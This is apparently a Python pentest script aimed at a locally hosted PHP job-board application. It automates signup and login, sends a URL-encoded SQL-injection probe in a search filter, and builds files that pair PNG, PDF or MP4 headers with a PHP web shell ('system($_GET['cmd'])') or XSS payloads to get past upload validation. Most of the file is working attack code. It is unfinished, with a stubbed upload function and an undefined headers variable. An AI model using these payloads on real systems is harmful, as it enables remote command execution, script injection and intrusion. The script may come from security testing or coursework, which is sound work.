import requests

ACCOUNT = {
    "name": "asd",
    "email": "asd@asd.com",
    "password": "asd",
}

COMPANY = {
    "name": "asdasd",
    "email": "asd@as.com",
    "password": "asd",
    "location": "asd",
    "about": "asd",
}

HOST = "http://localhost:8080/"

PHPSESSID_USER = ""
PHPSESSID_COMPANY = ""

def get_headers(isUser: bool):
    global PHPSESSID_USER, PHPSESSID_COMPANY
    
    headers = {}
    
    headers['Cookie'] = f"PHPSESSID={PHPSESSID_USER}" if isUser else f"PHPSESSID={PHPSESSID_COMPANY}"
    
    return headers

def encoded_custom(input_text: str):
    ans = ""
    for c in input_text:
        ans += "%" + hex(ord(c))[2:]
    
    return ans

def do_signup():
    global ACCOUNT, COMPANY
    url = "auth/sign-up/"
    
    # signup user
    res = requests.post(HOST + url + "job-seeker", data=ACCOUNT)
    print(res.status_code)
    
    # signup company
    res = requests.post(HOST + url + "company", data=COMPANY)
    print(res.status_code)
    
    

def do_signin(isUser: bool):
    global PHPSESSID_USER, PHPSESSID_COMPANY
    
    url = "auth/sign-in"
    payload = {
        "email": ACCOUNT['email'] if isUser else COMPANY['email'],
        "password": ACCOUNT['password'] if isUser else COMPANY['email']
    }
    
    # get the id first
    res = requests.get(HOST + url)
    PHPSESSID = res.cookies.get('PHPSESSID')
    
    if isUser:
        PHPSESSID_USER = PHPSESSID
    else:
        PHPSESSID_COMPANY = PHPSESSID
    
    # sign in (same session id)
    res = requests.post(HOST + url, data=payload)
    # print(res.text)

def do_jobsearch():
    global PHPSESSID, headers
    url = "jobs"
    payload = encoded_custom("-- '")
    print(payload)

    params = {
      "search": "",
      "sort-created-at": "newest-first",
      "created-at-from": "",
      "created-at-to=": "",
      'job-types[]': ['full-time ' + payload, 'part-time', 'internship']
    } 

    res = requests.get(HOST + url, headers=headers, params=params)
    # print(res.text)
    

def generate_file(signature: str, payload: str, filename: str):
    
    SIGNATURES = {
        "PNG": bytes.fromhex("89 50 4E 47 0D 0A 1A 0A 0000 000d 4948 4452"),
        "PDF": bytes.fromhex("2550 4446 2d31 2e37 0a25 e2e3 cfd3 0a37"),
                            #  2030 206f 626a 0a3c"),
        "MP4": bytes.fromhex("00 00 00 1c 66 74 79 70 6d 70 34 32 00 00 00 01 6973 "),
                            #  6f6d 6d70 3431 6d70 3432 0000 1e9a 6d6f 6f76 0000 006c 6d76 6864 0000 0000 e111 1048 e111 1049 0000 ac44 0007 66ec"),
    }
    
    PAYLOAD_LIST = {
        "php_rce": b"<?php echo system(\$_GET['cmd']); ?>",
        "xss": b"<html><?php echo 'iniedbertawikwok'; ?>\n<img src=x onerror=alert(1));>\n<script>alert(1)</script></html>",
    }
    
    file_content = SIGNATURES[signature] + PAYLOAD_LIST[payload]
    
    with open(filename, "wb") as f:
        f.write(file_content)
    
    print(f"Generated file: {filename}")
    return filename

def send_file(file_path: str):
    url = "http://localhost:8080/jobs/75969/apply"
    
    pass
    
if __name__ == "__main__":
    # done sign in
    # do_signup()
    # do_signin(True)
    # do_signin(False)
    
    # try to upload file
    # do_jobsearch()
    generate_file("PNG", "xss", "payload_test.png")
    generate_file("PDF", "xss", "payload_test.pdf")
    generate_file("MP4", "xss", "awikwok.mp4")